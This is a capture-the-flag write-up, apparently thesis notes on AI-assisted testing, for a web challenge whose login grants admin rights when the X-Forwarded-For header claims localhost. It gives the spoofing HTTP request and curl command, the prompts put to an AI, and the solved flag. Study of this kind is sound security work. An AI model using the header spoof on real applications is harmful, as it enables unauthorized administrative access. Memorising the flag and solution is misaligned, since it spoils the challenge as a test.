# **Challenge: XBEN-085-24**

## **1\. Overview**

- **Difficulty:** Easy
- **Type:** Web
- **Category:** Broken Authorization / Insecure Design / Business Logic
- **Goal:** Obtain administrative privileges and retrieve the flag

## **2\. Initial Analysis**

- **Description of the application  
    **The application is a simple web page with a login form requiring a username and password. After submission, the server returns either a welcome message or an access denied message.
- **Observed endpoints**
    - GET /index.php → displays the login form
    - POST /index.php → handles the login request
- **First impressions  
    **At first glance, it appears to be a typical authentication system, potentially vulnerable to SQL injection or credential bypass.  
    However, this assumption is risky: the login form might only be a decoy.

## **3\. Workflow Reconstruction**

### **Normal Flow**

1.  The user enters a username and password
2.  The browser sends a POST request to /index.php
3.  The server processes the input and returns a response

### **Critical Points**

- The code does not actually verify the credentials
- Admin access depends on an HTTP header (X-Forwarded-For)
- There is no session management or real authentication mechanism

## **4\. Hypotheses**

### **Possible vulnerabilities:**

- Authentication bypass (login without credential validation)
- HTTP header manipulation
- Incorrect trust in client-controlled data

### **Test ideas:**

- Submit arbitrary credentials to check validation
- Manipulate HTTP headers (e.g., X-Forwarded-For)
- Simulate requests originating from localhost
- Analyze server-side source code

## **5\. AI Support**

### **Prompts Used**

- “Analyze this PHP login logic and identify vulnerabilities”
- “Can X-Forwarded-For be trusted for authentication?”
- “How to bypass IP-based restrictions in web apps?”

### **AI Responses**

- The AI correctly identified the insecure use of the X-Forwarded-For header
- It suggested the possibility of spoofing the client IP
- It pointed out that credential validation was missing

### **Critical Analysis**

- **What was useful**
    - Rapid identification of the main vulnerability
    - Direct suggestion of the exploit (header spoofing)
- **What was incorrect**
    - No major errors, but it tends to oversimplify the context (does not always distinguish between trusted and untrusted proxies)
- **What was missing**
    - Deeper analysis of the full application logic
    - Lack of discussion about trust boundaries and design flaws

## **6\. Exploitation**

### **Steps:**

1.  Send a POST request with any username and password
2.  Add the header X-Forwarded-For: 127.0.0.1
3.  The server grants admin access and reveals the flag

### **Requests / payloads:**

POST /index.php HTTP/1.1

Host: target

Content-Type: application/x-www-form-urlencoded

X-Forwarded-For: 127.0.0.1

username=test&password=test

Or:

curl -X POST http://TARGET/index.php \\

\-H "X-Forwarded-For: 127.0.0.1" \\

\-d "username=test&password=test"

## **7\. Final Solution**

- **Root cause of the vulnerability  
    **The application relies on a client-controlled HTTP header (X-Forwarded-For) to determine administrative privileges.
- **Exploit explanation  
    **The attacker can spoof the header to simulate a request coming from localhost (127.0.0.1), gaining admin access without authentication.
- **Result obtained  
    **Administrative access and flag retrieval:

flag{0860966c-999f-4fbb-8072-0187ae47abec}

## **8\. Lessons Learned**

- **What worked**
    - Server-side code analysis
    - Manual testing of HTTP headers
    - Not stopping at the surface level (login form)
- **What didn’t**
    - Assuming a SQL injection vulnerability too early
    - Trusting the apparent application flow
- **Role of AI**
    - Useful for quickly identifying known patterns
    - Limited in deep understanding of application logic

## **9\. Notes for Thesis**

- **Key observations**
    - HTTP headers are not reliable unless properly validated
    - Security must not rely on client-controlled data
    - Authentication and authorization must be clearly separated
- **Reusable insights**
    - Always verify the trust boundary
    - Do not assume that a login form implies real authentication
    - Business logic flaws are often more dangerous than technical vulnerabilities
